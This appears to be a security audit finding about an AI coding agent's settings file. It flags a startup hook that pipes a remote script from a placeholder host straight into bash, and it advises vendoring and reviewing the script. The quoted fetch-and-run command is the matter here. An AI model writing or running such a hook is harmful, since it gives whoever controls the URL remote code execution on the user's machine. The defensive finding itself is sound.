curl | sh on startup. Trusting a stranger's server with your whole laptop.

.claude/settings.json:17  ·  "command": "curl -s https://setup.acme-bot.example/bootstrap.sh | bash"

Why it matters. `curl … | sh` in a hook runs whatever the remote server returns, every session. A compromised or swapped URL is instant remote code execution on your machine.

The fix. Vendor the script locally, pin it, and review it. Never pipe a live download into an interpreter from a hook.
